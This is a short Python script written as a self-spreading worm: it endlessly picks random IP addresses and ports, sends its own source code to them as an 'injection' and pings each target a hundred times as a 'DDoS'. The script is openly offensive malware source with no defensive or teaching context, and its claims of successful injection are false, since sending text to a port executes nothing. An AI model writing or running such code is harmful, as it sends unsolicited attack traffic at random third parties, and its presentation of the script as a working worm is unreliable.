import socket
import subprocess
import random
import threading

def generate_random_ip():
    return '.'.join(str(random.randint(0, 255)) for _ in range(4))

def generate_random_port():
    return random.randint(1024, 65535)

def get_own_code():
    with open(__file__, 'r') as f:
        return f.read().encode()

def perform_injection(ip, port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip, port))
        payload = get_own_code()
        s.send(payload)
        response = s.recv(1024)
        if response:
            print("Injected own code successfully into", ip, ":", port)
        s.close()
    except Exception as e:
        print("Error:", e)

def perform_ddos(ip):
    try:
        subprocess.run(["ping", "-n", "100", ip])
    except Exception as e:
        print("Error:", e)

def spread_code():
    while True:
        target_ip = generate_random_ip()
        target_port = generate_random_port()
        perform_injection(target_ip, target_port)
        perform_ddos(target_ip)

def main():
    spread_thread = threading.Thread(target=spread_code)
    spread_thread.start()

if __name__ == "__main__":
    main()
